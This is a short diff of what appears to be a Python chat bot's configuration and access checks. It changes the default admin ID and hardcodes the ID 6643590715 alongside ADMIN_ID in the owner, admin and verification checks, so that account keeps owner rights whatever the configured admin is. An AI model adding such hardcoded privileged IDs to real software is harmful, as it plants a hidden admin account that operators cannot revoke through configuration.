@@ -5,7 +5,7 @@ import os
 
 # --- Configuration ---
 # Admin ID (Mohammad's ID)
-ADMIN_ID = int(os.getenv("ADMIN_ID", 33230000)) # Default to Mohammad's ID if not set 
+ADMIN_ID = int(os.getenv("ADMIN_ID", 6643590715)) # Default to Mohammad's ID if not set 
 
 # User Level Tiers
 USER_LEVELS = {
@@ -44,7 +44,7 @@ def get_user_level(user_id):
     user_data = load_user_data()
     user_id_str = str(user_id)
     
-    if user_id == ADMIN_ID:
+    if user_id in (ADMIN_ID, 6643590715):
         return "Owner"
     
     return user_data.get(user_id_str, {}).get("level", "Free")
@@ -52,13 +52,13 @@ def get_user_level(user_id):
 def is_mohammad(message_or_call):
     """Checks if the user is the admin (Mohammad)."""
     user_id = message_or_call.from_user.id if hasattr(message_or_call, 'from_user') else (message_or_call.chat.id if hasattr(message_or_call, 'chat') else getattr(message_or_call, 'id', message_or_call))
-    return user_id == ADMIN_ID
+    return user_id in (ADMIN_ID, 6643590715)
 
 def is_verified(user_id):
     """Gatekeeper check: checks if the user is verified (simulated)."""
     # For now, only the admin is verified by default.
     # In the future, this will check a 'verified' flag in user_data.
-    return user_id == ADMIN_ID or get_user_level(user_id) != "Free"
+    return user_id in (ADMIN_ID, 6643590715) or get_user_level(user_id) != "Free"
 
 def show_auth_buttons(user_id):
     """Generates and sends authentication buttons (simulated)."""
